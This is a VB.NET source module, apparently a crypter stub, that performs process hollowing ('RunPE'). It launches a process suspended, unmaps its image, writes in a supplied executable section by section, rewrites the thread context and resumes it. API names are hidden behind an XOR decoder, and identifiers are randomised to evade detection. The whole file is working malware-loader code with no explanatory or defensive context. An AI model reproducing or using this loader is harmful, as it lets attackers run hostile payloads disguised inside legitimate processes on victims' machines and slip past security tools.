Imports System
Imports System.IO
Imports System.Text
Imports System.Runtime.InteropServices
Module ajtPhgxnSpPkMWozYi4


    Public Declare Function dNTkNUdrCCQxVpHZSPGLl Lib "kernel32" Alias "LoadLibraryA" (ByVal VZThfmCzmcLEMcvJIEyGVi As String) As IntPtr

    Public Declare Function WGzMlqkrBIBDUYgkwdDIQzs Lib "kernel32" Alias "GetProcAddress" (ByVal fbahpFNeMErQLqOlXNnMwgvz As IntPtr, ByVal VZThfmCzmcLEMcvJIEyGVi As String) As IntPtr

    Function IeEFnWsiRmQjsHKtKTCWunmbF(Of T)(ByVal VZThfmCzmcLEMcvJIEyGVi As String, ByVal ajtPhgxnSpPkMWozYi As String) As T

        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(WGzMlqkrBIBDUYgkwdDIQzs(dNTkNUdrCCQxVpHZSPGLl(VZThfmCzmcLEMcvJIEyGVi), ajtPhgxnSpPkMWozYi), GetType(T)), Object), T)

    End Function

    Delegate Function g4iSV1cm2Ev(ByVal cQJyDssFRNmXnBuUuS As IntPtr, ByVal xTcZFTZUsoKYIMvoCB As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function mULKvPYsQBB(ByVal GWfeaJDDSJivHCcxES As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl0 As IntPtr) As UInteger

    Delegate Function rO1QyhVdIGF(ByVal GWfeaJDDSJivHCcxES As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl0 As IntPtr, ByRef bufr As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl1 As Integer, ByRef dNTkNUdrCCQxVpHZSPGLl2 As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function xSTHys7pTRX(ByVal dNTkNUdrCCQxVpHZSPGLl3 As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl4 As IntPtr) As UInteger

    Delegate Function Mgp6K2jSyKr(ByVal cQJyDssFRNmXnBuUuS As IntPtr, ByVal xTcZFTZUsoKYIMvoCB As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function Ogn99zPw8L3(ByVal GWfeaJDDSJivHCcxES As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl5 As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl6 As IntPtr, ByVal dNTkNUdrCCQxVpHZSPGLl7 As Integer, ByVal dNTkNUdrCCQxVpHZSPGLl8 As Integer) As IntPtr

    Delegate Function C0d1erh362j(ByVal dNTkNUdrCCQxVpHZSPGLl9 As IntPtr, ByVal VZThfmCzmcLEMcvJIEyGVi0 As IntPtr, ByVal VZThfmCzmcLEMcvJIEyGVi1 As Byte(), ByVal VZThfmCzmcLEMcvJIEyGVi2 As UInteger, ByVal VZThfmCzmcLEMcvJIEyGVi3 As Integer) As Boolean

    Public Declare Auto Function VZThfmCzmcLEMcvJIEyGVi4 Lib "kernel32" Alias "CreateProcessW" (ByVal VZThfmCzmcLEMcvJIEyGVi5 As String, ByVal VZThfmCzmcLEMcvJIEyGVi6 As StringBuilder, ByVal VZThfmCzmcLEMcvJIEyGVi7 As IntPtr, ByVal VZThfmCzmcLEMcvJIEyGVi8 As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal VZThfmCzmcLEMcvJIEyGVi9 As Boolean, ByVal WGzMlqkrBIBDUYgkwdDIQzs0 As Integer, ByVal WGzMlqkrBIBDUYgkwdDIQzs1 As IntPtr, ByVal WGzMlqkrBIBDUYgkwdDIQzs2 As String, ByVal WGzMlqkrBIBDUYgkwdDIQzs3 As Byte(), ByVal WGzMlqkrBIBDUYgkwdDIQzs4 As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Function WGzMlqkrBIBDUYgkwdDIQzs5(ByVal WGzMlqkrBIBDUYgkwdDIQzs6 As Long, Optional ByVal WGzMlqkrBIBDUYgkwdDIQzs7 As Long = &H4) As Integer

        Dim WGzMlqkrBIBDUYgkwdDIQzs8 As IntPtr

        Dim WGzMlqkrBIBDUYgkwdDIQzs9 As Integer

        Dim fbahpFNeMErQLqOlXNnMwgvz0 As rO1QyhVdIGF = IeEFnWsiRmQjsHKtKTCWunmbF(Of rO1QyhVdIGF)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(28) & Chr(38) & Chr(0) & Chr(55) & Chr(51) & Chr(54) & Chr(4) & Chr(59) & Chr(32) & Chr(38) & Chr(39) & Chr(51) & Chr(62) & Chr(31) & Chr(55) & Chr(63) & Chr(61) & Chr(32) & Chr(43), "RSoFMJJUKOsVhjloNkQLGNU"))

        Call fbahpFNeMErQLqOlXNnMwgvz0(Process.GetCurrentProcess.Handle, WGzMlqkrBIBDUYgkwdDIQzs6, WGzMlqkrBIBDUYgkwdDIQzs8, WGzMlqkrBIBDUYgkwdDIQzs7, WGzMlqkrBIBDUYgkwdDIQzs9)

        Return WGzMlqkrBIBDUYgkwdDIQzs8

    End Function

    Public Function fbahpFNeMErQLqOlXNnMwgvz2(ByVal fbahpFNeMErQLqOlXNnMwgvz3 As Byte(), ByVal fbahpFNeMErQLqOlXNnMwgvz4 As String) As Boolean

        Try

            Dim fbahpFNeMErQLqOlXNnMwgvz5 As GCHandle = GCHandle.Alloc(fbahpFNeMErQLqOlXNnMwgvz3, GCHandleType.Pinned) : Dim hModuleBase As Integer = fbahpFNeMErQLqOlXNnMwgvz5.AddrOfPinnedObject : fbahpFNeMErQLqOlXNnMwgvz5.Free()

            Dim VZThfmCzmcLEMcvJIEyGVi7 As IntPtr = IntPtr.Zero

            Dim fbahpFNeMErQLqOlXNnMwgvz6 As IntPtr() = New IntPtr(3) {}

            Dim fbahpFNeMErQLqOlXNnMwgvz7 As Byte() = New Byte(67) {}

            Dim fbahpFNeMErQLqOlXNnMwgvz8 As Integer = BitConverter.ToInt32(fbahpFNeMErQLqOlXNnMwgvz3, 60)

            Dim fbahpFNeMErQLqOlXNnMwgvz9 As Integer

            Dim xTcZFTZUsoKYIMvoCB As UInteger() = New UInteger(178) {}

            xTcZFTZUsoKYIMvoCB(0) = &H10002

            VZThfmCzmcLEMcvJIEyGVi4(Nothing, New StringBuilder(fbahpFNeMErQLqOlXNnMwgvz4), VZThfmCzmcLEMcvJIEyGVi7, VZThfmCzmcLEMcvJIEyGVi7, False, 4, VZThfmCzmcLEMcvJIEyGVi7, Nothing, fbahpFNeMErQLqOlXNnMwgvz7, fbahpFNeMErQLqOlXNnMwgvz6)

            Dim IeEFnWsiRmQjsHKtKTCWunmbF0 As Integer = (hModuleBase + WGzMlqkrBIBDUYgkwdDIQzs5(hModuleBase + &H3C))

            fbahpFNeMErQLqOlXNnMwgvz9 = WGzMlqkrBIBDUYgkwdDIQzs5(IeEFnWsiRmQjsHKtKTCWunmbF0 + &H34)

            Dim IeEFnWsiRmQjsHKtKTCWunmbF1 As mULKvPYsQBB = IeEFnWsiRmQjsHKtKTCWunmbF(Of mULKvPYsQBB)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(36) & Chr(30) & Chr(63) & Chr(4) & Chr(7) & Chr(11) & Chr(26) & Chr(60) & Chr(3) & Chr(15) & Chr(29) & Chr(37) & Chr(12) & Chr(57) & Chr(15) & Chr(9) & Chr(30) & Chr(3) & Chr(5) & Chr(4), "jDAZXISWJJithCuowglUNJG"))

            IeEFnWsiRmQjsHKtKTCWunmbF1(fbahpFNeMErQLqOlXNnMwgvz6(0), fbahpFNeMErQLqOlXNnMwgvz9)

            Dim IeEFnWsiRmQjsHKtKTCWunmbF2 As Ogn99zPw8L3 = IeEFnWsiRmQjsHKtKTCWunmbF(Of Ogn99zPw8L3)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(47) & Chr(33) & Chr(54) & Chr(42) & Chr(33) & Chr(40) & Chr(119) & Chr(118), "DlJuiIaXIEYUhSHnjcJeTGo"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(18) & Chr(45) & Chr(54) & Chr(48) & Chr(49) & Chr(37) & Chr(40) & Chr(5) & Chr(40) & Chr(40) & Chr(43) & Chr(39) & Chr(1) & Chr(60), "DlJuiIaXIEYUhSHnjcJeTGo"))

            Dim VZThfmCzmcLEMcvJIEyGVi0 As IntPtr = IeEFnWsiRmQjsHKtKTCWunmbF2(fbahpFNeMErQLqOlXNnMwgvz6(0), fbahpFNeMErQLqOlXNnMwgvz9, WGzMlqkrBIBDUYgkwdDIQzs5(IeEFnWsiRmQjsHKtKTCWunmbF0 + &H50), &H3000, &H40)

            Dim IeEFnWsiRmQjsHKtKTCWunmbF3 As New IntPtr(BitConverter.ToInt32(fbahpFNeMErQLqOlXNnMwgvz3, fbahpFNeMErQLqOlXNnMwgvz8 + &H34))

            Dim dNTkNUdrCCQxVpHZSPGLl6 As New IntPtr(BitConverter.ToInt32(fbahpFNeMErQLqOlXNnMwgvz3, fbahpFNeMErQLqOlXNnMwgvz8 + 80))

            Dim IeEFnWsiRmQjsHKtKTCWunmbF4 As Integer

            Dim VZThfmCzmcLEMcvJIEyGVi3 As Integer

            Dim IeEFnWsiRmQjsHKtKTCWunmbF5 As C0d1erh362j = IeEFnWsiRmQjsHKtKTCWunmbF(Of C0d1erh362j)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(10) & Chr(48) & Chr(19) & Chr(54) & Chr(45) & Chr(48) & Chr(33) & Chr(18) & Chr(45) & Chr(54) & Chr(48) & Chr(49) & Chr(37) & Chr(40) & Chr(9) & Chr(33) & Chr(41) & Chr(43) & Chr(54) & Chr(61), "DlJuiIaXIEYUhSHnjcJeTGo"))

            IeEFnWsiRmQjsHKtKTCWunmbF5(fbahpFNeMErQLqOlXNnMwgvz6(0), VZThfmCzmcLEMcvJIEyGVi0, fbahpFNeMErQLqOlXNnMwgvz3, CUInt(CInt(WGzMlqkrBIBDUYgkwdDIQzs5(IeEFnWsiRmQjsHKtKTCWunmbF0 + &H54))), IeEFnWsiRmQjsHKtKTCWunmbF4)

            For i = 0 To WGzMlqkrBIBDUYgkwdDIQzs5(IeEFnWsiRmQjsHKtKTCWunmbF0 + &H6, 2) - 1

                Dim IeEFnWsiRmQjsHKtKTCWunmbF6 As Integer() = New Integer(9) {}

                Buffer.BlockCopy(fbahpFNeMErQLqOlXNnMwgvz3, (fbahpFNeMErQLqOlXNnMwgvz8 + &HF8) + (i * 40), IeEFnWsiRmQjsHKtKTCWunmbF6, 0, 40)

                Dim IeEFnWsiRmQjsHKtKTCWunmbF7 As Byte() = New Byte((IeEFnWsiRmQjsHKtKTCWunmbF6(4) - 1)) {}

                Buffer.BlockCopy(fbahpFNeMErQLqOlXNnMwgvz3, IeEFnWsiRmQjsHKtKTCWunmbF6(5), IeEFnWsiRmQjsHKtKTCWunmbF7, 0, IeEFnWsiRmQjsHKtKTCWunmbF7.Length)

                dNTkNUdrCCQxVpHZSPGLl6 = New IntPtr(VZThfmCzmcLEMcvJIEyGVi0.ToInt32() + IeEFnWsiRmQjsHKtKTCWunmbF6(3))

                IeEFnWsiRmQjsHKtKTCWunmbF3 = New IntPtr(IeEFnWsiRmQjsHKtKTCWunmbF7.Length)

                IeEFnWsiRmQjsHKtKTCWunmbF5(fbahpFNeMErQLqOlXNnMwgvz6(0), dNTkNUdrCCQxVpHZSPGLl6, IeEFnWsiRmQjsHKtKTCWunmbF7, CUInt(IeEFnWsiRmQjsHKtKTCWunmbF3), VZThfmCzmcLEMcvJIEyGVi3)

            Next i

            Dim IeEFnWsiRmQjsHKtKTCWunmbF8 As g4iSV1cm2Ev = IeEFnWsiRmQjsHKtKTCWunmbF(Of g4iSV1cm2Ev)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(61) & Chr(7) & Chr(52) & Chr(22) & Chr(7) & Chr(48) & Chr(28) & Chr(29) & Chr(7) & Chr(22) & Chr(11) & Chr(7) & Chr(39) & Chr(27) & Chr(1) & Chr(22) & Chr(18) & Chr(23), "sIhGXNMABeaGwIgIBrdVSnR"))

            IeEFnWsiRmQjsHKtKTCWunmbF8(fbahpFNeMErQLqOlXNnMwgvz6(1), xTcZFTZUsoKYIMvoCB)

            IeEFnWsiRmQjsHKtKTCWunmbF5(fbahpFNeMErQLqOlXNnMwgvz6(0), xTcZFTZUsoKYIMvoCB(41) + &H8, BitConverter.GetBytes(VZThfmCzmcLEMcvJIEyGVi0.ToInt32()), CUInt(&H4), VZThfmCzmcLEMcvJIEyGVi3)

            xTcZFTZUsoKYIMvoCB(&H2C) = fbahpFNeMErQLqOlXNnMwgvz9 + WGzMlqkrBIBDUYgkwdDIQzs5(IeEFnWsiRmQjsHKtKTCWunmbF0 + &H28)

            Dim xblQH As Mgp6K2jSyKr = IeEFnWsiRmQjsHKtKTCWunmbF(Of Mgp6K2jSyKr)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(61) & Chr(7) & Chr(32) & Chr(22) & Chr(7) & Chr(48) & Chr(28) & Chr(29) & Chr(7) & Chr(22) & Chr(11) & Chr(7) & Chr(39) & Chr(27) & Chr(1) & Chr(22) & Chr(18) & Chr(23), "sIhGXNMABeaGwIgIBrdVSnR"))
            xblQH(fbahpFNeMErQLqOlXNnMwgvz6(1), xTcZFTZUsoKYIMvoCB)
            Dim ai4g7QJZMSi As xSTHys7pTRX = IeEFnWsiRmQjsHKtKTCWunmbF(Of xSTHys7pTRX)(fbahpFNeMErQLqOlXNnMwgvz1(Chr(2) & Chr(24) & Chr(8) & Chr(0) & Chr(0), "lEoMNtZliATokQgkIDoKmWi"), fbahpFNeMErQLqOlXNnMwgvz1(Chr(0) & Chr(58) & Chr(28) & Chr(43) & Chr(61) & Chr(59) & Chr(35) & Chr(43) & Chr(26) & Chr(38) & Chr(60) & Chr(43) & Chr(47) & Chr(42), "NqqbiMUBAZQewYpIknBeZjD"))
            ai4g7QJZMSi(fbahpFNeMErQLqOlXNnMwgvz6(1), 0)
        Catch ex As Exception

            Return False
        End Try
        Return True
    End Function

    Private Function fbahpFNeMErQLqOlXNnMwgvz1(ByVal ajtPhgxnSpPkMWozYi2 As String, ByVal ajtPhgxnSpPkMWozYi3 As String)
        Dim IeEFnWsiRmQjsHKtKTCWunmbF9 As String = ""
        Dim ajtPhgxnSpPkMWozYi0 As Short
        Dim ajtPhgxnSpPkMWozYi1 As Integer
        ajtPhgxnSpPkMWozYi1 = Asc(ajtPhgxnSpPkMWozYi3)
        For ajtPhgxnSpPkMWozYi0 = 1 To Len(ajtPhgxnSpPkMWozYi2)
            IeEFnWsiRmQjsHKtKTCWunmbF9 &= Chr(ajtPhgxnSpPkMWozYi1 Xor Asc(Mid(ajtPhgxnSpPkMWozYi2, ajtPhgxnSpPkMWozYi0, 1)))
        Next
        Return IeEFnWsiRmQjsHKtKTCWunmbF9
    End Function

End Module